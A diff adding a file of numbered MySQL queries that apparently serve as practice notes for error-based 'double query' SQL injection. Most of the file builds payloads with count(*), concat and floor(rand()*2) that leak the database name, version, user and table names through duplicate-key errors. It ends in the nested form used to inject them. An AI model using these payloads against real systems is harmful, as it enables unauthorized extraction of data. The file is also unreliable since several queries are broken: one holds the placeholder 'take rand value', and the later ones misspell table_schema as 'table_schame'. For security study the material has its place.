@@ -1,0 +1,36 @@
+1. select count(*) from information_schema.tables;
+2. select rand();
+3. select rand()*4;
+4. select floor(take rand value);
+5. select floor(rand()*2);
+6. select floor(rand()*2) as a;
+7. select table_name, table_schema from information_schema.tables group by table_schema;
+8. select database();
+9. select(select database());
+10. select concat((select database()));
+11. select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+12. select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
+13. select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a;
+14. select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns;
+15. select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables;
+16. select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+17. select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a;
+
+18. select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+19. select count(*), concat(0x3a,0x3a,(select version()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+20. select count(*), concat(0x3a,0x3a,(select user()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+21. select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+22. select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database() limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+23. select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database() limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+24. select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database() limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+
+25. (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database() limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a))
+
+26. (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schame=database() limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a)b)
